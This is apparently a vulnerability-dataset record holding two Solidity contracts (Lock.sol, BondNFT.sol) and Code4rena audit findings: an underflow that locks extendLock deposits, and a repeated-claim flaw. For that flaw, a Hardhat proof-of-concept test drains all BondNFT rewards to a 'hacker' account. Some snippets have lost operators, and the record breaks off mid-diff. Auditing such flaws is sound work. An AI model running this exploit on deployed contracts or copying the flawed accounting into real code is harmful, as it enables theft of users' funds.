[
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"hardhat/console.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"./interfaces/IBondNFT.sol\";\nimport \"./interfaces/IGovNFT.sol\";\n\ncontract Lock is Ownable{\n\n    uint public constant minPeriod = 7;\n    uint public constant maxPeriod = 365;\n\n    IBondNFT public immutable bondNFT;\n    IGovNFT public immutable govNFT;\n\n    mapping(address => bool) public allowedAssets;\n    mapping(address => uint) public totalLocked;\n\n    constructor(\n        address _bondNFTAddress,\n        address _govNFT\n    ) {\n        bondNFT = IBondNFT(_bondNFTAddress);\n        govNFT = IGovNFT(_govNFT);\n    }\n\n    /**\n     * @notice Claim pending rewards from a bond\n     * @param _id Bond NFT id\n     * @return address claimed tigAsset address\n     */\n    function claim(\n        uint256 _id\n    ) public returns (address) {\n        claimGovFees();\n        (uint _amount, address _tigAsset) = bondNFT.claim(_id, msg.sender);\n        IERC20(_tigAsset).transfer(msg.sender, _amount);\n        return _tigAsset;\n    }\n\n    /**\n     * @notice Claim pending rewards left over from a bond transfer\n     * @param _tigAsset token address being claimed\n     */\n    function claimDebt(\n        address _tigAsset\n    ) external {\n        claimGovFees();\n        uint amount = bondNFT.claimDebt(msg.sender, _tigAsset);\n        IERC20(_tigAsset).transfer(msg.sender, amount);\n    }\n\n    /**\n     * @notice Lock up tokens to create a bond\n     * @param _asset tigAsset being locked\n     * @param _amount tigAsset amount\n     * @param _period number of days to be locked for\n     */\n    function lock(\n        address _asset,\n        uint _amount,\n        uint _period\n    ) public {\n        require(_period <= maxPeriod, \"MAX PERIOD\");\n        require(_period >= minPeriod, \"MIN PERIOD\");\n        require(allowedAssets[_asset], \"!asset\");\n\n        claimGovFees();\n\n        IERC20(_asset).transferFrom(msg.sender, address(this), _amount);\n        totalLocked[_asset] += _amount;\n        \n        bondNFT.createLock( _asset, _amount, _period, msg.sender);\n    }\n\n    /**\n     * @notice Reset the lock time and extend the period and/or token amount\n     * @param _id Bond id being extended\n     * @param _amount tigAsset amount being added\n     * @param _period number of days being added\n     */\n    function extendLock(\n        uint _id,\n        uint _amount,\n        uint _period\n    ) public {\n        address _asset = claim(_id);\n        IERC20(_asset).transferFrom(msg.sender, address(this), _amount);\n        bondNFT.extendLock(_id, _asset, _amount, _period, msg.sender);\n    }\n\n    /**\n     * @notice Release the bond once it's expired\n     * @param _id Bond id being released\n     */\n    function release(\n        uint _id\n    ) public {\n        claimGovFees();\n        (uint amount, uint lockAmount, address asset, address _owner) = bondNFT.release(_id, msg.sender);\n        totalLocked[asset] -= lockAmount;\n        IERC20(asset).transfer(_owner, amount);\n    }\n\n    /**\n     * @notice Claim rewards from gov nfts and distribute them to bonds\n     */\n    function claimGovFees() public {\n        address[] memory assets = bondNFT.getAssets();\n\n        for (uint i=0; i < assets.length; i++) {\n            uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));\n            IGovNFT(govNFT).claim(assets[i]);\n            uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));\n            IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);\n            bondNFT.distribute(assets[i], balanceAfter - balanceBefore);\n        }\n    }\n\n    /**\n     * @notice Whitelist an asset\n     * @param _tigAsset tigAsset token address\n     * @param _isAllowed set tigAsset as allowed\n     */\n    function editAsset(\n        address _tigAsset,\n        bool _isAllowed\n    ) external onlyOwner() {\n        allowedAssets[_tigAsset] = _isAllowed;\n    }\n\n    /**\n     * @notice Owner can retreive Gov NFTs\n     * @param _ids array of gov nft ids\n     */\n    function sendNFTs(\n        uint[] memory _ids\n    ) external onlyOwner() {\n        govNFT.safeTransferMany(msg.sender, _ids);\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract BondNFT is ERC721Enumerable, Ownable {\n    \n    uint constant private DAY = 24 * 60 * 60;\n\n    struct Bond {\n        uint id;\n        address owner;\n        address asset;\n        uint amount;\n        uint mintEpoch;\n        uint mintTime;\n        uint expireEpoch;\n        uint pending;\n        uint shares;\n        uint period;\n        bool expired;\n    }\n\n    mapping(address => uint256) public epoch;\n    uint private totalBonds;\n    string public baseURI;\n    address public manager;\n    address[] public assets;\n\n    mapping(address => bool) public allowedAsset;\n    mapping(address => uint) private assetsIndex;\n    mapping(uint256 => mapping(address => uint256)) private bondPaid;\n    mapping(address => mapping(uint256 => uint256)) private accRewardsPerShare; // tigAsset => epoch => accRewardsPerShare\n    mapping(uint => Bond) private _idToBond;\n    mapping(address => uint) public totalShares;\n    mapping(address => mapping(address => uint)) public userDebt; // user => tigAsset => amount\n\n    constructor(\n        string memory _setBaseURI,\n        string memory _name,\n        string memory _symbol\n    ) ERC721(_name, _symbol) {\n        baseURI = _setBaseURI;\n    }\n\n    /**\n     * @notice Create a bond\n     * @dev Should only be called by a manager contract\n     * @param _asset tigAsset token to lock\n     * @param _amount tigAsset amount\n     * @param _period time to lock for in days\n     * @param _owner address to receive the bond\n     * @return id ID of the minted bond\n     */\n    function createLock(\n        address _asset,\n        uint _amount,\n        uint _period,\n        address _owner\n    ) external onlyManager() returns(uint id) {\n        require(allowedAsset[_asset], \"!Asset\");\n        unchecked {\n            uint shares = _amount * _period / 365;\n            uint expireEpoch = epoch[_asset] + _period;\n            id = ++totalBonds;\n            totalShares[_asset] += shares;\n            Bond memory _bond = Bond(\n                id,             // id\n                address(0),     // owner\n                _asset,         // tigAsset token\n                _amount,        // tigAsset amount\n                epoch[_asset],  // mint epoch\n                block.timestamp,// mint timestamp\n                expireEpoch,    // expire epoch\n                0,              // pending\n                shares,         // linearly scaling share of rewards\n                _period,        // lock period\n                false           // is expired boolean\n            );\n            _idToBond[id] = _bond;\n            _mint(_owner, _bond);\n        }\n        emit Lock(_asset, _amount, _period, _owner, id);\n    }\n\n    /** \n     * @notice Extend the lock period and/or amount of a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond\n     * @param _asset tigAsset token address\n     * @param _amount amount of tigAsset being added\n     * @param _period days being added to the bond\n     * @param _sender address extending the bond\n     */\n    function extendLock(\n        uint _id,\n        address _asset,\n        uint _amount,\n        uint _period,\n        address _sender\n    ) external onlyManager() {\n        Bond memory bond = idToBond(_id);\n        Bond storage _bond = _idToBond[_id];\n        require(bond.owner == _sender, \"!owner\");\n        require(!bond.expired, \"Expired\");\n        require(bond.asset == _asset, \"!BondAsset\");\n        require(bond.pending == 0);\n        require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n        require(bond.period+_period <= 365, \"MAX PERIOD\");\n        unchecked {\n            uint shares = (bond.amount + _amount) * (bond.period + _period) / 365;\n            uint expireEpoch = block.timestamp/DAY + bond.period + _period;\n            totalShares[bond.asset] += shares-bond.shares;\n            _bond.shares = shares;\n            _bond.amount += _amount;\n            _bond.expireEpoch = expireEpoch;\n            _bond.period += _period;\n            _bond.mintTime = block.timestamp;\n            _bond.mintEpoch = epoch[bond.asset];\n            bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18;\n        }\n        emit ExtendLock(_period, _amount, _sender,  _id);\n    }\n\n    /**\n     * @notice Release a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond\n     * @param _releaser address initiating the release of the bond\n     * @return amount amount of tigAsset returned\n     * @return lockAmount amount of tigAsset locked in the bond\n     * @return asset tigAsset token released\n     * @return _owner bond owner\n     */\n    function release(\n        uint _id,\n        address _releaser\n    ) external onlyManager() returns(uint amount, uint lockAmount, address asset, address _owner) {\n        Bond memory bond = idToBond(_id);\n        require(bond.expired, \"!expire\");\n        if (_releaser != bond.owner) {\n            unchecked {\n                require(bond.expireEpoch + 7 < epoch[bond.asset], \"Bond owner priority\");\n            }\n        }\n        amount = bond.amount;\n        unchecked {\n            totalShares[bond.asset] -= bond.shares;\n            (uint256 _claimAmount,) = claim(_id, bond.owner);\n            amount += _claimAmount;\n        }\n        asset = bond.asset;\n        lockAmount = bond.amount;\n        _owner = bond.owner;\n        _burn(_id);\n        emit Release(asset, lockAmount, _owner, _id);\n    }\n    /**\n     * @notice Claim rewards from a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond to claim rewards from\n     * @param _claimer address claiming rewards\n     * @return amount amount of tigAsset claimed\n     * @return tigAsset tigAsset token address\n     */\n    function claim(\n        uint _id,\n        address _claimer\n    ) public onlyManager() returns(uint amount, address tigAsset) {\n        Bond memory bond = idToBond(_id);\n        require(_claimer == bond.owner, \"!owner\");\n        amount = bond.pending;\n        tigAsset = bond.asset;\n        unchecked {\n            if (bond.expired) {\n                uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);\n                if (totalShares[bond.asset] > 0) {\n                    accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n                }\n            }\n            bondPaid[_id][bond.asset] += amount;\n        }\n        IERC20(tigAsset).transfer(manager, amount);\n        emit ClaimFees(tigAsset, amount, _claimer, _id);\n    }\n\n    /**\n     * @notice Claim user debt left from bond transfer\n     * @dev Should only be called by a manager contract\n     * @param _user user address\n     * @param _tigAsset tigAsset token address\n     * @return amount amount of tigAsset claimed\n     */\n    function claimDebt(\n        address _user,\n        address _tigAsset\n    ) public onlyManager() returns(uint amount) {\n        amount = userDebt[_user][_tigAsset];\n        userDebt[_user][_tigAsset] = 0;\n        IERC20(_tigAsset).transfer(manager, amount);\n        emit ClaimDebt(_tigAsset, amount, _user);\n    }\n\n    /**\n     * @notice Distribute rewards to bonds\n     * @param _tigAsset tigAsset token address\n     * @param _amount tigAsset amount\n     */\n    function distribute(\n        address _tigAsset,\n        uint _amount\n    ) external {\n        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n        IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n        unchecked {\n            uint aEpoch = block.timestamp / DAY;\n            if (aEpoch > epoch[_tigAsset]) {\n                for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n                    epoch[_tigAsset] += 1;\n                    accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];\n                }\n            }\n            accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];\n        }\n        emit Distribution(_tigAsset, _amount);\n    }\n\n    /**\n     * @notice Get all data for a bond\n     * @param _id ID of the bond\n     * @return bond Bond object\n     */\n    function idToBond(uint256 _id) public view returns (Bond memory bond) {\n        bond = _idToBond[_id];\n        bond.owner = ownerOf(_id);\n        bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n        unchecked {\n            uint _accRewardsPerShare = accRewardsPerShare[bond.asset][bond.expired ? bond.expireEpoch-1 : epoch[bond.asset]];\n            bond.pending = bond.shares * _accRewardsPerShare / 1e18 - bondPaid[_id][bond.asset];\n        }\n    }\n\n    /*\n     * @notice Get expired boolean for a bond\n     * @param _id ID of the bond\n     * @return bool true if bond is expired\n     */\n    function isExpired(uint256 _id) public view returns (bool) {\n        Bond memory bond = _idToBond[_id];\n        return bond.expireEpoch <= epoch[bond.asset] ? true : false;\n    }\n\n    /*\n     * @notice Get pending rewards for a bond\n     * @param _id ID of the bond\n     * @return bool true if bond is expired\n     */\n    function pending(\n        uint256 _id\n    ) public view returns (uint256) {\n        return idToBond(_id).pending;\n    }\n\n    function totalAssets() public view returns (uint256) {\n        return assets.length;\n    }\n\n    /*\n     * @notice Gets an array of all whitelisted token addresses\n     * @return address array of addresses\n     */\n    function getAssets() public view returns (address[] memory) {\n        return assets;\n    }\n\n    function _baseURI() internal override view returns (string memory) {\n        return baseURI;\n    }\n\n    function safeTransferMany(address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                _transfer(_msgSender(), _to, _ids[i]);\n            }\n        }\n    }\n\n    function safeTransferFromMany(address _from, address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                safeTransferFrom(_from, _to, _ids[i]);\n            }\n        }\n    }\n\n    function approveMany(address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                approve(_to, _ids[i]);\n            }\n        }\n    }\n\n    function _mint(\n        address to,\n        Bond memory bond\n    ) internal {\n        unchecked {\n            bondPaid[bond.id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * bond.shares / 1e18;\n        }\n        _mint(to, bond.id);\n    }\n\n    function _burn(\n        uint256 _id\n    ) internal override {\n        delete _idToBond[_id];\n        super._burn(_id);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 _id\n    ) internal override {\n        Bond memory bond = idToBond(_id);\n        require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n        require(!bond.expired, \"Expired!\");\n        unchecked {\n            require(block.timestamp > bond.mintTime + 300, \"Recent update\");\n            userDebt[from][bond.asset] += bond.pending;\n            bondPaid[_id][bond.asset] += bond.pending;\n        }\n        super._transfer(from, to, _id);\n    }\n\n    function balanceIds(address _user) public view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](balanceOf(_user));\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                _ids[i] = tokenOfOwnerByIndex(_user, i);\n            }\n        }\n        return _ids;\n    }\n\n    function addAsset(address _asset) external onlyOwner {\n        require(assets.length == 0 || assets[assetsIndex[_asset]] != _asset, \"Already added\");\n        assetsIndex[_asset] = assets.length;\n        assets.push(_asset);\n        allowedAsset[_asset] = true;\n        epoch[_asset] = block.timestamp/DAY;\n    }\n\n    function setAllowedAsset(address _asset, bool _bool) external onlyOwner {\n        require(assets[assetsIndex[_asset]] == _asset, \"Not added\");\n        allowedAsset[_asset] = _bool;\n    }\n\n    function setBaseURI(string calldata _newBaseURI) external onlyOwner {\n        baseURI = _newBaseURI;\n    }\n\n    function setManager(\n        address _manager\n    ) public onlyOwner() {\n        manager = _manager;\n    }\n\n    modifier onlyManager() {\n        require(msg.sender == manager, \"!manager\");\n        _;\n    }\n\n    event Distribution(address _tigAsset, uint256 _amount);\n    event Lock(address _tigAsset, uint256 _amount, uint256 _period, address _owner, uint256 _id);\n    event ExtendLock(uint256 _period, uint256 _amount, address _owner, uint256 _id);\n    event Release(address _tigAsset, uint256 _amount, address _owner, uint256 _id);\n    event ClaimFees(address _tigAsset, uint256 _amount, address _claimer, uint256 _id);\n    event ClaimDebt(address _tigAsset, uint256 _amount, address _owner);\n}\n\n",
        "CodeNames": [
            "Lock.sol",
            "BondNFT.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "javascript\ndescribe(\"ReleaseUnderflow\", function () {\n    it(\"release can cause underflow\", async function () {\n        await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"110\"));\n        // Lock 100 for 9 days\n        await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 9);\n\n        await bond.connect(owner).setManager(lock.address);\n\n        await stabletoken.connect(user).approve(lock.address, ethers.utils.parseEther(\"10\"));\n\n        // Lock another 10\n        await lock.connect(user).extendLock(1, ethers.utils.parseEther(\"10\"), 0);\n\n        await network.provider.send(\"evm_increaseTime\", 864000]); // Skip 10 days\n        await network.provider.send(\"evm_mine\");\n\n        // Try to release 110 after bond has expired - Underflow\n        await lock.connect(user).release(1);\n    });\n});\n"
                ],
                "Type": " Lock.sol: assets deposited with Lock.extendLock function are lost",
                "Description": "*Submitted by HollaDieWaldfee(https://github.com/code-423n4/2022-12-tigris-findings/issues/23), also found by sha256yan(https://github.com/code-423n4/2022-12-tigris-findings/issues/560), kaliberpoziomka8552(https://github.com/code-423n4/2022-12-tigris-findings/issues/558), 0xsomeone(https://github.com/code-423n4/2022-12-tigris-findings/issues/447), cccz(https://github.com/code-423n4/2022-12-tigris-findings/issues/330), 0xbepresent(https://github.com/code-423n4/2022-12-tigris-findings/issues/264), ali_shehab(https://github.com/code-423n4/2022-12-tigris-findings/issues/262), Ruhum(https://github.com/code-423n4/2022-12-tigris-findings/issues/253), rvierdiiev(https://github.com/code-423n4/2022-12-tigris-findings/issues/180), and csanuragjain(https://github.com/code-423n4/2022-12-tigris-findings/issues/132)*\n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10 \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76 \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92 \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105\n\n\nThe Lock contract (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10) allows end-users to interact with bonds.\n\nThere are two functions that allow to lock some amount of assets. The first function is Lock.lock (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76) which creates a new bond. The second function is Lock.extendLock (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92). This function extends the lock for some _period and / or increases the locked amount by some _amount.\n\nThe issue is that the Lock.extendLock function does not increase the value in totalLocked[_asset]. This however is necessary because totalLocked[_asset] is reduced when Lock.release (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105) is called.\n\nTherefore only the amount of assets deposited via Lock.lock can be released again. The amount of assets deposited using Lock.extendLock can never be released again because reducing totalLocked[_asset] will cause a revert due to underflow.\n\nSo the amount of assets deposited using Lock.extendLock is lost.\n\n\n1.  User A calls Lock.lock to lock a certain _amount (amount1) of _asset for a certain _period.\n2.  User A calls then Lock.extendLock and increases the locked amount of the bond by some amount2\n3.  User A waits until the bond has expired\n4.  User A calls Lock.release. This function calculates totalLocked[asset] -= lockAmount;. Which will cause a revert because the value of totalLocked[asset] is only amount1\n\nYou can add the following test to the Bonds test in Bonds.js:\n\njavascript\ndescribe(\"ReleaseUnderflow\", function () {\n    it(\"release can cause underflow\", async function () {\n        await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"110\"));\n        // Lock 100 for 9 days\n        await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 9);\n\n        await bond.connect(owner).setManager(lock.address);\n\n        await stabletoken.connect(user).approve(lock.address, ethers.utils.parseEther(\"10\"));\n\n        // Lock another 10\n        await lock.connect(user).extendLock(1, ethers.utils.parseEther(\"10\"), 0);\n\n        await network.provider.send(\"evm_increaseTime\", 864000]); // Skip 10 days\n        await network.provider.send(\"evm_mine\");\n\n        // Try to release 110 after bond has expired - Underflow\n        await lock.connect(user).release(1);\n    });\n});\n\n\nRun it with npx hardhat test --grep \"release can cause underflow\".\nYou can see that it fails because it causes an underflow.\n\n\nVS Code\n\n",
                "Repair": "\nAdd totalLocked[_asset] += amount to the Lock.extendLock function.\n\nTriHaz (Tigris Trade) confirmed(https://github.com/code-423n4/2022-12-tigris-findings/issues/23)\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/23#issuecomment-1383078283):\n  The warden has shown an issue with accounting that will cause principal deposits added via extendLock to be lost, for this reason I agree with High Severity.\n\nGainsGoblin (Tigris Trade) resolved(https://github.com/code-423n4/2022-12-tigris-findings/issues/23#issuecomment-1407130352):\n  Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419172200\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-05",
                "Location": [
                    "//solidity\n  if (bond.expired) {\n      uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 bondPaid[_id][bond.asset]) (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 bondPaid[_id][bond.asset]);\n      if (totalShares[bond.asset]  0) {\n          accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n      }\n  }\n",
                    "javascript\ndiff --git a/test/09.Bonds.js b/test/09.Bonds.js\nindex 16c3ff5..7c445c3 100644\n--a/test/09.Bonds.js\n+++ b/test/09.Bonds.js\n@@ -245,7 +245,90 @@ describe(\"Bonds\", function () {\n       await lock.connect(user).release(2);\n       expect(await bond.pending(1)).to.be.equals(\"999999999999999999725\"); // Negligable difference from 1000e18 due to //solidity division\n     });\n+\n+    it.only(\"Drain BondNFT rewards\", async function () {\n+      const getState = async () = {\n+        const balHacker= await stabletoken.balanceOf(hacker.address);\n+        const balLock = await stabletoken.balanceOf(lock.address);\n+        const balBond = await stabletoken.balanceOf(bond.address);\n+        const pending1, pending2, pending3] = await bond.pending(1), await bond.pending(2), await bond.pending(3)];\n+        return { hacker: balHacker, lock: balLock, bond: balBond, pending1, pending2, pending3};\n+      };\n+      const parseEther = (v) = ethers.utils.parseEther(v.toString());\n+      const gwei = parseEther(1).div(1e9);\n+\n+      // prepare tokens\n+      const TotalRewards = parseEther(8000);\n+      await stabletoken.connect(owner).mintFor(owner.address, TotalRewards);\n+      await stabletoken.connect(owner).mintFor(user.address, parseEther(1000));\n+      const hacker = rndAddress;\n+      await stabletoken.connect(owner).mintFor(hacker.address, parseEther(2000+700));\n+      await stabletoken.connect(hacker).approve(Lock.address, parseEther(2000));\n+\n+      // bond1 user\n+      await lock.connect(user).lock(StableToken.address, parseEther(1000), 100);\n+      await bond.distribute(stabletoken.address, parseEther(3800));\n+      expect(await bond.pending(1)).to.be.closeTo(parseEther(3800), gwei);\n+      // Skip some time\n+      await network.provider.send(\"evm_increaseTime\", 20*86400]);\n+      await network.provider.send(\"evm_mine\");\n+\n+      // bond2 hacker\n+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 10);\n+      // bond3 hacker\n+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 100);\n+\n+      await bond.distribute(stabletoken.address, parseEther(2100));\n+\n+      // Skip 10+ days, bond2 is expired\n+      await network.provider.send(\"evm_increaseTime\", 13*86400]);\n+      await network.provider.send(\"evm_mine\");\n+      await bond.distribute(stabletoken.address, parseEther(2100));\n+\n+      // check balances before hack\n+      let st = await getState();\n+      expect(st.bond).to.be.equals(TotalRewards);\n+      expect(st.lock).to.be.equals(parseEther(3000));\n+      expect(st.hacker).to.be.equals(parseEther(0+700));\n+      expect(st.pending1).to.be.closeTo(parseEther(3800+1000+1000), gwei);\n+      expect(st.pending2).to.be.closeTo(parseEther(100), gwei);\n+      expect(st.pending3).to.be.closeTo(parseEther(1000+1000), gwei);\n+\n+      // first claim of expired bond2\n+      await lock.connect(hacker).claim(2);\n+      st = await getState();\n+      expect(st.bond).to.be.closeTo(TotalRewards.sub(parseEther(100)), gwei);\n+      expect(st.hacker).to.be.closeTo(parseEther(100+700), gwei);\n+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));\n+      expect(st.pending2).to.be.eq(parseEther(0));\n+      expect(st.pending3).to.be.gt(parseEther(1000+1000));\n+\n+      // hack\n+      const remainReward = st.bond;\n+      let pending3 = st.pending3;\n+      let i = 0;\n+      for (; remainReward.gt(pending3); i++) {\n+        // claim expired bond2 repeatedly\n+        await lock.connect(hacker).claim(2);\n+        // pending3 keeps increasing\n+        pending3 = await bond.pending(3);\n+      }\n+      console.log(`claim count: ${i}nremain: ${ethers.utils.formatEther(remainReward)}npending3: ${ethers.utils.formatEther(pending3)}n`);\n+\n+      // send diff, then drain rewards in bond\n+      await stabletoken.connect(hacker).transfer(bond.address, pending3.sub(remainReward));\n+      await lock.connect(hacker).claim(3);\n+      st = await getState();\n+      // !! bond is drained !!\n+      expect(st.bond).to.be.eq(0);\n+      // !! hacker gets all rewards !!\n+      expect(st.hacker).to.be.eq(TotalRewards.add(parseEther(700)));\n+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));\n+      expect(st.pending2).to.be.eq(0);\n+      expect(st.pending3).to.be.eq(0);\n+    });\n   });\n+\n   describe(\"Withdrawing\", function () {\n     it(\"Only expired bonds can be withdrawn\", async function () {\n       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"100\"));\n",
                    "\n  Bonds\n    Rewards\nclaim count: 41\nremain: 7900.000000000000000002\npending3: 8055.7342616570405578\n\n      \u2713 Drain BondNFT rewards\n\n  1 passing (4s)\n\n"
                ],
                "Type": " Malicious user can steal all assets in BondNFT",
                "Description": "*Submitted by hihen(https://github.com/code-423n4/2022-12-tigris-findings/issues/170), also found by hansfriese(https://github.com/code-423n4/2022-12-tigris-findings/issues/503), unforgiven(https://github.com/code-423n4/2022-12-tigris-findings/issues/423), __141345__(https://github.com/code-423n4/2022-12-tigris-findings/issues/398), rvierdiiev(https://github.com/code-423n4/2022-12-tigris-findings/issues/182), and HollaDieWaldfee(https://github.com/code-423n4/2022-12-tigris-findings/issues/68)*\n\nMalicious user can drain all assets in BondNFT, and other users will lose their rewards.\n\n\nWhen calling BondNFT.claim()(https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187) for an expired bond, it will recalculate accRewardsPerShare. This is because the reward after the expireEpoch does not belong to that expired bond and needs to be redistributed to all other bonds.\n\nsolidity\n  if (bond.expired) {\n      uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 bondPaid[_id][bond.asset]) (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 bondPaid[_id][bond.asset]);\n      if (totalShares[bond.asset]  0) {\n          accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n      }\n  }\n\n\nIn the current implementation of BondNFT.claim()(https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187), it can be called repeatedly as long as the expired bond is not released.\n\nAccording to the formula in the above code, we can find that although each subsequent claim() of the expired bond will transfer 0 reward, the accRewardsPerShare will be updated cumulatively.\nThus, the pending rewards of all other users will increase every time the expired bond is claim()ed.\n\nA malicious user can exploit this vulnerability to steal all assets in BondNFT contract:\n\n1.  Create two bonds (B1, B2) with different expireEpoch\n2.  At some time after B1 has expired (B2 has not), keep calling Lock.claim(B1)(https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract.\n3.  Call Lock.claim(B2)(https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to claim all pending rewards of B2.\n\nAn example of such an attack:\n\njavascript\ndiff --git a/test/09.Bonds.js b/test/09.Bonds.js\nindex 16c3ff5..7c445c3 100644\n--a/test/09.Bonds.js\n+++ b/test/09.Bonds.js\n@@ -245,7 +245,90 @@ describe(\"Bonds\", function () {\n       await lock.connect(user).release(2);\n       expect(await bond.pending(1)).to.be.equals(\"999999999999999999725\"); // Negligable difference from 1000e18 due to solidity division\n     });\n+\n+    it.only(\"Drain BondNFT rewards\", async function () {\n+      const getState = async () = {\n+        const balHacker= await stabletoken.balanceOf(hacker.address);\n+        const balLock = await stabletoken.balanceOf(lock.address);\n+        const balBond = await stabletoken.balanceOf(bond.address);\n+        const pending1, pending2, pending3] = await bond.pending(1), await bond.pending(2), await bond.pending(3)];\n+        return { hacker: balHacker, lock: balLock, bond: balBond, pending1, pending2, pending3};\n+      };\n+      const parseEther = (v) = ethers.utils.parseEther(v.toString());\n+      const gwei = parseEther(1).div(1e9);\n+\n+      // prepare tokens\n+      const TotalRewards = parseEther(8000);\n+      await stabletoken.connect(owner).mintFor(owner.address, TotalRewards);\n+      await stabletoken.connect(owner).mintFor(user.address, parseEther(1000));\n+      const hacker = rndAddress;\n+      await stabletoken.connect(owner).mintFor(hacker.address, parseEther(2000+700));\n+      await stabletoken.connect(hacker).approve(Lock.address, parseEther(2000));\n+\n+      // bond1 user\n+      await lock.connect(user).lock(StableToken.address, parseEther(1000), 100);\n+      await bond.distribute(stabletoken.address, parseEther(3800));\n+      expect(await bond.pending(1)).to.be.closeTo(parseEther(3800), gwei);\n+      // Skip some time\n+      await network.provider.send(\"evm_increaseTime\", 20*86400]);\n+      await network.provider.send(\"evm_mine\");\n+\n+      // bond2 hacker\n+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 10);\n+      // bond3 hacker\n+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 100);\n+\n+      await bond.distribute(stabletoken.address, parseEther(2100));\n+\n+      // Skip 10+ days, bond2 is expired\n+      await network.provider.send(\"evm_increaseTime\", 13*86400]);\n+      await network.provider.send(\"evm_mine\");\n+      await bond.distribute(stabletoken.address, parseEther(2100));\n+\n+      // check balances before hack\n+      let st = await getState();\n+      expect(st.bond).to.be.equals(TotalRewards);\n+      expect(st.lock).to.be.equals(parseEther(3000));\n+      